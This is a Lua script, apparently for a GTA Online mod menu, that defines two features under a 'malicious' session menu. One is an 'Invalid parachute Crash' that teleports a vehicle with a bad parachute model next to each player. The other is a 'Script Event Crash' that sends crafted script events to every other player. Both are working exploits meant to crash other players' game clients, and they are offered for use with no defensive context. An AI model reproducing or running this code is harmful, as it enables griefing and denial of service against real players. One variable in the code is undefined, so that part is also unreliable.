menu.add_feature("Invalid parachute Crash", "action", ses_malicious.id, function(feat, pid) 
    local me = player.get_player_ped(player.player_id())
    local startcoords = entity.get_entity_coords(me)
    streaming.request_model(gameplay.get_hash_key("prop_beach_parasol_03"))
    while not streaming.has_model_loaded(gameplay.get_hash_key("prop_beach_parasol_03")) do
        system.yield(0)
    end
    streaming.request_model(0x381E10BD)
    while not streaming.has_model_loaded(0x381E10BD) do
        system.yield(500)
    --    menu.notify("model not loaded", "debug", 9, 50)
    end

    local crash_veh = vehicle.create_vehicle(0x381E10BD, startcoords, 0, true, false)
    ped.set_ped_into_vehicle(me, crash_veh, -1)
   -- system.wait(2500)

    entity.set_entity_coords_no_offset(crash_veh, v3(-91, -616, 351))
    native.call(0x0BFFB028B3DD0A97, crash_veh, true)
    native.call(0x4D610C6B56031351, crash_veh, gameplay.get_hash_key("prop_beach_parasol_03"))
    system.yield(100)
    native.call(0x0BFFB028B3DD0A97, crash_veh, true)

    system.wait(7000)

    for pid = 0, 31 do
        if player.is_player_valid(pid) then
            local target = player.get_player_coords(pid) + v3(0, 10, 10)
            entity.set_entity_coords_no_offset(crash_veh, target)
            native.call(0x0BFFB028B3DD0A97, crash_veh, true)
            native.call(0x4D610C6B56031351, crash_veh, hash_key)
            system.yield(100)
            native.call(0x0BFFB028B3DD0A97, crash_veh, true)
            system.yield(250)
        end
    end

    system.wait(500)

    ped.clear_ped_tasks_immediately(me)
    entity.delete_entity(crash_veh)
    entity.set_entity_coords_no_offset(me, startcoords)
end)

-- sure this could be threaded for a tiny bit more efficiency but it's not really necessary, and i don't want to deal with sending too many script events at once.
menu.add_feature("Script Event Crash", "action", ses_malicious.id, function(feat) 
for pid = 0, 32 do 
    if player.is_player_valid(pid) and pid ~= player.player_id() then 
        script.trigger_script_event(209000166, pid, {-1638522928, 0, 512, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        script.trigger_script_event(-1638522928, pid, {0, 512, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        script.trigger_script_event(209000166, pid, {-830063381, 0, 512, 1, 0, 0, -1393470468, -982789948, -233612726})
        script.trigger_script_event(-830063381, pid, {0, 512, 1, 0, 0, -1393470468, -982789948, -233612726})
    end
    system.yield(10)
end
end)